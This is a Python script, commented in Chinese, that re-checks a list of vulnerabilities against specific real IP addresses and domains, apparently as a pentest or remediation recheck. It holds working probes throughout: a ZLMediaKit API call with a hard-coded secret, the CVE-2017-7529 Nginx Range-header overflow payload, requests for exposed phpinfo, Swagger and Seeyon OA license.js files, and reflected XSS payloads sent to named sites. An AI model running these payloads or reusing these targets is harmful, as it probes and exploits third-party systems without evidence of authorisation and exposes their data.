#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
全部漏洞一键验证脚本
"""

import requests
import socket
import json
import time
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})

results = []

def add_result(vuln_name, risk, asset, status, detail):
    results.append({
        "vuln": vuln_name,
        "risk": risk,
        "asset": asset,
        "status": status,
        "detail": detail,
    })
    icon = "✅" if status == "存在" else ("⚠️" if status == "待确认" else "❌")
    print(f"  {icon} [{status}] {asset} -> {detail[:80]}")

print("=" * 80)
print("  全部漏洞一键验证")
print("  时间: " + time.strftime("%Y-%m-%d %H:%M:%S"))
print("=" * 80)

# ============================================================
# 1. OpenSSH 用户名枚举
# ============================================================
print(f"\n{'='*80}")
print("  [1] OpenSSH 用户名枚举漏洞 (CVE-2018-15473)")
print(f"{'='*80}")

for port in [63389, 63390, 63391]:
    target = f"58.220.24.217:{port}"
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(("58.220.24.217", port))
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()
        if "OpenSSH" in banner:
            version = banner.split("OpenSSH_")[1].split()[0] if "OpenSSH_" in banner else "unknown"
            if float(version) < 7.7:
                add_result("OpenSSH用户名枚举", "中风险", target, "存在", f"版本OpenSSH_{version} < 7.7")
            else:
                add_result("OpenSSH用户名枚举", "中风险", target, "已修复", f"版本OpenSSH_{version} >= 7.7")
        else:
            add_result("OpenSSH用户名枚举", "中风险", target, "待确认", f"Banner: {banner[:50]}")
    except socket.timeout:
        add_result("OpenSSH用户名枚举", "中风险", target, "超时", "连接超时")
    except Exception as e:
        add_result("OpenSSH用户名枚举", "中风险", target, "连接失败", str(e)[:60])

# ============================================================
# 2. ZLMediaKit 未授权访问
# ============================================================
print(f"\n{'='*80}")
print("  [2] ZLMediaKit 未授权访问漏洞")
print(f"{'='*80}")

zl_targets = [
    "http://58.220.222.66:8090",
    "http://58.220.222.66:18090",
    "https://58.220.222.66:8091",
]
secret = "035c73f7-bb6b-4889-a715-d9eb2d1925cc"

for base in zl_targets:
    url = f"{base}/index/api/getApiList?secret={secret}"
    try:
        resp = session.get(url, timeout=8)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("code") == 0:
                    api_count = len(data.get("data", []))
                    add_result("ZLMediaKit未授权访问", "中风险", base, "存在", f"返回{api_count}个API接口")
                else:
                    add_result("ZLMediaKit未授权访问", "中风险", base, "待确认", f"code={data.get('code')}")
            except:
                if resp.status_code == 200 and len(resp.content) > 100:
                    add_result("ZLMediaKit未授权访问", "中风险", base, "存在", f"返回200+内容")
                else:
                    add_result("ZLMediaKit未授权访问", "中风险", base, "待确认", f"HTTP 200")
        elif resp.status_code == 503:
            add_result("ZLMediaKit未授权访问", "中风险", base, "服务不可用", "503 Service Unavailable")
        elif resp.status_code == 401 or resp.status_code == 403:
            add_result("ZLMediaKit未授权访问", "中风险", base, "已修复", f"HTTP {resp.status_code}")
        else:
            add_result("ZLMediaKit未授权访问", "中风险", base, "待确认", f"HTTP {resp.status_code}")
    except requests.exceptions.Timeout:
        add_result("ZLMediaKit未授权访问", "中风险", base, "超时", "连接超时")
    except Exception as e:
        add_result("ZLMediaKit未授权访问", "中风险", base, "连接失败", str(e)[:60])

# ============================================================
# 3. PHPINFO 信息泄露
# ============================================================
print(f"\n{'='*80}")
print("  [3] PHPINFO 信息泄露")
print(f"{'='*80}")

phpinfo_targets = [
    "http://www.wxfxz.cn:80",
    "http://www.wxfxz.cn:8080",
    "http://www.wxfxz.cn:8088",
    "http://39.98.94.0:8080",
    "http://39.98.94.0:8088",
]

for base in phpinfo_targets:
    url = f"{base}/dashboard/phpinfo.php"
    try:
        resp = session.get(url, timeout=8)
        if resp.status_code == 200:
            if "PHP Version" in resp.text or "phpinfo()" in resp.text or "PHP Variables" in resp.text:
                version_match = re.search(r'PHP Version\s*</td><td[^>]*>([^<]+)', resp.text)
                ver = version_match.group(1).strip() if version_match else "未知"
                add_result("PHPINFO信息泄露", "中风险", base, "存在", f"PHP版本: {ver}")
            else:
                add_result("PHPINFO信息泄露", "中风险", base, "待确认", "200但无phpinfo内容")
        elif resp.status_code == 503:
            add_result("PHPINFO信息泄露", "中风险", base, "服务不可用", "503")
        elif resp.status_code == 404:
            add_result("PHPINFO信息泄露", "中风险", base, "已修复", "404 文件已删除")
        else:
            add_result("PHPINFO信息泄露", "中风险", base, "待确认", f"HTTP {resp.status_code}")
    except requests.exceptions.Timeout:
        add_result("PHPINFO信息泄露", "中风险", base, "超时", "连接超时")
    except Exception as e:
        add_result("PHPINFO信息泄露", "中风险", base, "连接失败", str(e)[:60])

# ============================================================
# 4. Swagger UI 未授权访问
# ============================================================
print(f"\n{'='*80}")
print("  [4] Swagger UI 未授权访问")
print(f"{'='*80}")

swagger_targets = [
    ("http://hjlndx.tyzdtech.com:8081", "/api/v2/api-docs"),
    ("http://shop.tyzdtech.com:8081", "/api/v2/api-docs"),
    ("http://hjlndx.tyzdtech.com:8080", "/api/v2/api-docs"),
    ("http://shop.tyzdtech.com:8080", "/api/v2/api-docs"),
    ("http://www.hjspyw.ruijinyun.com:58080", "/v3/api-docs"),
    ("https://shop.tyzdtech.com", "/api/v2/api-docs"),
    ("https://43.139.80.254", "/api/v2/api-docs"),
    ("http://36.137.123.7:58080", "/v3/api-docs"),
    ("http://fly.tyzdtech.com:8080", "/v2/api-docs"),
    ("https://fly.tyzdtech.com", "/api/v2/api-docs"),
    ("http://43.139.80.254:8081", "/api/v2/api-docs"),
    ("http://fly.tyzdtech.com:8081", "/api/v2/api-docs"),
    ("http://43.139.80.254:8080", "/api/v2/api-docs"),
    ("http://gjh.ruijinyun.com:58080", "/v3/api-docs"),
    ("http://hjspyw.ruijinyun.com:58080", "/v3/api-docs"),
]

for base, path in swagger_targets:
    url = base + path
    try:
        resp = session.get(url, timeout=8)
        if resp.status_code == 200:
            try:
                data = json.loads(resp.text)
                if "swagger" in data or "openapi" in data:
                    ver = data.get("swagger", data.get("openapi", "?"))
                    title = data.get("info", {}).get("title", "未知")
                    apis = len(data.get("paths", {}))
                    add_result("Swagger未授权访问", "中风险", base, "存在", f"Swagger {ver} | {title} | {apis}个API")
                else:
                    add_result("Swagger未授权访问", "中风险", base, "待确认", "200但无Swagger标识")
            except:
                if "swagger" in resp.text.lower():
                    add_result("Swagger未授权访问", "中风险", base, "存在", "Swagger UI页面")
                else:
                    add_result("Swagger未授权访问", "中风险", base, "待确认", "200非JSON")
        elif resp.status_code == 401:
            add_result("Swagger未授权访问", "中风险", base, "已修复", "401 已加认证")
        elif resp.status_code == 403:
            add_result("Swagger未授权访问", "中风险", base, "已修复", "403 已限制访问")
        elif resp.status_code == 404:
            add_result("Swagger未授权访问", "中风险", base, "已修复", "404 路径已删除")
        else:
            add_result("Swagger未授权访问", "中风险", base, "待确认", f"HTTP {resp.status_code}")
    except requests.exceptions.Timeout:
        add_result("Swagger未授权访问", "中风险", base, "超时", "连接超时")
    except Exception as e:
        add_result("Swagger未授权访问", "中风险", base, "连接失败", str(e)[:60])

# ============================================================
# 5. Nginx 整数溢出 CVE-2017-7529
# ============================================================
print(f"\n{'='*80}")
print("  [5] Nginx 整数溢出 CVE-2017-7529")
print(f"{'='*80}")

nginx_targets = [
    "https://hjyl.jsmcxx.com:8099",
    "https://112.4.210.148:8099",
]

for base in nginx_targets:
    url = f"{base}/docs/architecture/"
    try:
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Range": "bytes=-3758,-9223372036854772050",
            "Connection": "close",
        }
        resp = session.get(url, headers=headers, timeout=10)
        server = resp.headers.get("Server", "N/A")

        if resp.status_code == 206:
            if "CATALINA_MIME_BOUNDARY" in resp.text or "<!DOCTYPE" in resp.text:
                add_result("Nginx整数溢出", "中风险", base, "存在", f"206 + 内容泄露 | Server: {server}")
            else:
                add_result("Nginx整数溢出", "中风险", base, "存在", f"206 | Server: {server}")
        elif resp.status_code == 416:
            add_result("Nginx整数溢出", "中风险", base, "已修复", f"416 Range Not Satisfiable | Server: {server}")
        elif resp.status_code == 200:
            add_result("Nginx整数溢出", "中风险", base, "待确认", f"200 忽略Range头 | Server: {server}")
        else:
            add_result("Nginx整数溢出", "中风险", base, "待确认", f"HTTP {resp.status_code} | Server: {server}")
    except requests.exceptions.Timeout:
        add_result("Nginx整数溢出", "中风险", base, "超时", "连接超时")
    except Exception as e:
        add_result("Nginx整数溢出", "中风险", base, "连接失败", str(e)[:60])

# ============================================================
# 6. 致远OA license.js 信息泄露
# ============================================================
print(f"\n{'='*80}")
print("  [6] 致远OA license.js 信息泄露")
print(f"{'='*80}")

seeyon_targets = [
    "http://61.132.33.70:8888",
    "http://58.220.195.234:8888",
]

for base in seeyon_targets:
    url = f"{base}/seeyon/common/office/license.js"
    try:
        resp = session.get(url, timeout=10)
        if resp.status_code == 200:
            if "___OfficeLicese" in resp.text or "授权" in resp.text:
                match = re.search(r'授权(.+?)\[', resp.text)
                org = match.group(1) if match else "未知"
                add_result("致远OA信息泄露", "中风险", base, "存在", f"授权单位: {org}")
            else:
                add_result("致远OA信息泄露", "中风险", base, "待确认", "200但无license内容")
        elif resp.status_code == 404:
            add_result("致远OA信息泄露", "中风险", base, "已修复", "404 文件已删除")
        else:
            add_result("致远OA信息泄露", "中风险", base, "待确认", f"HTTP {resp.status_code}")
    except requests.exceptions.Timeout:
        add_result("致远OA信息泄露", "中风险", base, "超时", "连接超时")
    except Exception as e:
        add_result("致远OA信息泄露", "中风险", base, "连接失败", str(e)[:60])

# ============================================================
# 7. XSS 跨站脚本
# ============================================================
print(f"\n{'='*80}")
print("  [7] XSS 跨站脚本漏洞")
print(f"{'='*80}")

xss_tests = [
    ("http://www.hjrc.cn/search.asp", {"page": "1", "txtitle": "test", "key": "1", "ckey2": "<script>alert(1)</script>", "szhiwei": "1", "area": "1", "keytype": "1"}, "<script>alert(1)</script>"),
    ("http://www.hjrc.cn/search.asp", {"page": "1", "txtitle": "test", "key": "1", "ckey2": '<img src=x onerror=alert(1)>', "szhiwei": "1", "area": "1", "keytype": "1"}, '<img src=x onerror=alert(1)>'),
    ("http://www.hjrc.cn/content/bio_list.asp", {"id": '"><script>alert(1)</script>'}, '<script>alert(1)</script>'),
]

for url, params, keyword in xss_tests:
    try:
        resp = session.get(url, params=params, timeout=10)
        if keyword in resp.text:
            add_result("XSS跨站脚本", "高风险", url.split("?")[0], "存在", f"Payload原样反射 ({keyword[:30]})")
        else:
            add_result("XSS跨站脚本", "高风险", url.split("?")[0], "待确认", f"HTTP {resp.status_code} Payload未反射")
    except requests.exceptions.Timeout:
        add_result("XSS跨站脚本", "高风险", url.split("?")[0], "超时", "连接超时")
    except Exception as e:
        add_result("XSS跨站脚本", "高风险", url.split("?")[0], "连接失败", str(e)[:60])

# XSS标签注入
xss_tag_tests = [
    ("http://www.hjrc.cn/search.asp", {"page": "2", "txtitle": "testtest", "key": "1", "ckey2": "1 web_xss_in_tag=85f7210c blah=", "szhiwei": "1", "area": "1", "keytype": "1"}, "web_xss_in_tag"),
]

for url, params, keyword in xss_tag_tests:
    try:
        resp = session.get(url, params=params, timeout=10)
        if keyword in resp.text:
            add_result("XSS标签注入", "高风险", url.split("?")[0], "存在", f"标签属性注入成功 ({keyword})")
        else:
            add_result("XSS标签注入", "高风险", url.split("?")[0], "待确认", f"HTTP {resp.status_code} 未反射")
    except:
        add_result("XSS标签注入", "高风险", url.split("?")[0], "连接失败", "")

# hjlib.cn
hjlib_tests = [
    "http://www.hjlib.cn:8088/navigation/oldNavigationFacet.do",
    "http://www.hjlib.cn:8088/navigation/newNavigationFacet.do",
    "http://thg.hjlib.cn:8088/navigation/oldNavigationFacet.do",
    "http://thg.hjlib.cn:8088/navigation/newNavigationFacet.do",
]

for url in hjlib_tests:
    try:
        resp = session.get(url, params={"keyWord": "1 web_xss_in_tag=85f7210c blah="}, timeout=8)
        if "web_xss_in_tag" in resp.text:
            add_result("XSS标签注入", "高风险", url, "存在", "标签属性注入成功")
        else:
            add_result("XSS标签注入", "高风险", url, "待确认", f"HTTP {resp.status_code} 未反射")
    except requests.exceptions.Timeout:
        add_result("XSS标签注入", "高风险", url, "超时", "连接超时")
    except Exception as e:
        add_result("XSS标签注入", "高风险", url, "连接失败", str(e)[:60])

# ============================================================
# 汇总
# ============================================================
print(f"\n\n{'='*80}")
print("  验证结果汇总")
print(f"{'='*80}")
print()

exist = [r for r in results if r["status"] == "存在"]
fixed = [r for r in results if r["status"] in ["已修复", "已删除"]]
failed = [r for r in results if r["status"] in ["连接失败", "超时", "服务不可用"]]
other = [r for r in results if r not in exist and r not in fixed and r not in failed]

print(f"  总计: {len(results)} 个目标")
print(f"  ✅ 漏洞存在: {len(exist)} 个")
print(f"  🔧 已修复: {len(fixed)} 个")
print(f"  ⚠️  待确认: {len(other)} 个")
print(f"  ❌ 连接异常: {len(failed)} 个")

if exist:
    print(f"\n{'-'*80}")
    print(f"  ✅ 仍然存在的漏洞 ({len(exist)}个):")
    print(f"{'-'*80}")
    for r in exist:
        print(f"  [{r['vuln']}] {r['risk']}")
        print(f"    {r['asset']}")
        print(f"    {r['detail']}")
        print()

if fixed:
    print(f"\n{'-'*80}")
    print(f"  🔧 已修复的漏洞 ({len(fixed)}个):")
    print(f"{'-'*80}")
    for r in fixed:
        print(f"  [{r['vuln']}] {r['asset']} -> {r['detail']}")

if failed:
    print(f"\n{'-'*80}")
    print(f"  ❌ 连接异常 ({len(failed)}个):")
    print(f"{'-'*80}")
    for r in failed:
        print(f"  [{r['vuln']}] {r['asset']} -> {r['status']}: {r['detail']}")

print(f"\n{'='*80}")
